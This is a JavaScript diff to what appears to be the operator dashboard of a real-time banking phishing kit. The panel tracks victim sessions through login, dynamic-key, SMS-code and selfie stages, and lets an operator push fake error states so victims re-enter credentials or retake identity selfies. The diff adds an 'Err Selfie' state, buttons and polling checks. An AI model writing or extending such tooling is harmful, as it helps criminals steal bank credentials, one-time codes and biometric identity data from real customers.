@@ -31,6 +31,7 @@ function statusLabel(state) {
   if (state === 'received-selfie') return 'Selfie tomada'
   if (state === 'error-dinamica') return 'Error Dinámica'
   if (state === 'error-sms') return 'Error SMS/Correo'
+  if (state === 'error-selfie') return 'Error Selfie'
   if (state === 'typing') return 'Escribiendo código'
   return 'Nuevo'
 }
@@ -57,6 +58,7 @@ function badgeClass(state) {
     state === 'error-login' ||
     state === 'error-dinamica' ||
     state === 'error-sms' ||
+    state === 'error-selfie' ||
     state === 'error'
   ) {
     return 'badge badge--error'
@@ -154,6 +156,7 @@ function createRow(row) {
         <button type="button" class="btn btn--ok" data-action="selfie" style="background:#7c3aed; color:#fff; border-color:#6d28d9;">Selfie</button>
         <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
         <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
+        <button type="button" class="btn btn--error" data-action="error-selfie">Err Selfie</button>
         <button type="button" class="btn btn--done" data-action="done">Listo</button>
       </div>
     </td>
@@ -193,6 +196,10 @@ function createRow(row) {
   })
   tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-sms', 'error-sms')
+    playErrorSound()
+  })
+  tr.querySelector('[data-action="error-selfie"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-selfie', 'error-selfie')
     playErrorSound()
   })
   tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
@@ -333,6 +340,7 @@ function render() {
             <div class="selfie-card-meta">${laneName} · ${formatTime(row.updatedAt || row.createdAt)}</div>
             <div class="selfie-card-actions">
               <button type="button" class="btn btn--ok" style="background:#7c3aed; color:#fff;" onclick="window.openSelfieModal('${row.selfie}', '${docUser}')">🔍 Ver</button>
+              <button type="button" class="btn btn--error" onclick="window.setRowState('${row.id}', 'error-selfie', 'error-selfie')">❌ Err</button>
               <button type="button" class="btn btn--done" onclick="window.setRowState('${row.id}', 'done', 'done')">✅ Listo</button>
             </div>
           </div>
@@ -410,6 +418,7 @@ async function pollSessions() {
               session.state === 'error-login' ||
               session.state === 'error-dinamica' ||
               session.state === 'error-sms' ||
+              session.state === 'error-selfie' ||
               session.state === 'done'
             ) {
               hasNewOrChangedSession = true;
